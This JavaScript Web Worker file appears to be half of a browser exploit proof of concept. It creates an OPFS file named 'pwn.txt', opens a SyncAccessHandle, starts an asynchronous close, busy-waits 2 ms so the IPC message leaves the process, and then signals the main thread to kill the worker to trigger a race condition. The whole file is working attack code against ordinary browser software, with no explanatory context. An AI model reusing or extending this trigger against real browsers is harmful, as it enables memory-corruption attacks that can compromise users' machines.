// worker.js
function log(msg) {
    postMessage({ type: 'log', msg: "[Worker] " + msg });
}

async function triggerRace() {
    try {
        log("Requesting OPFS directory...");
        const root = await navigator.storage.getDirectory();

        log("Creating target file (pwn.txt)...");
        const fileHandle = await root.getFileHandle('pwn.txt', { create: true });

        log("Opening SyncAccessHandle...");
        const accessHandle = await fileHandle.createSyncAccessHandle();

        log("Handle opened. Firing close() and signaling race...");

        // TASK A: Start the asynchronous close operation.
        accessHandle.close();

        // THE TWEAK: Busy wait for exactly 2 milliseconds.
        // This ensures the Mojo IPC message actually leaves the process
        // before we blow up the worker thread.
        const end = performance.now() + 2; 
        while(performance.now() < end) { }

        // TASK B: Signal the main thread to terminate this worker.
        postMessage({ type: 'RACE_NOW' });

    } catch (e) {
        postMessage({ type: 'error', msg: e.name + ": " + e.message });
    }
}

triggerRace();
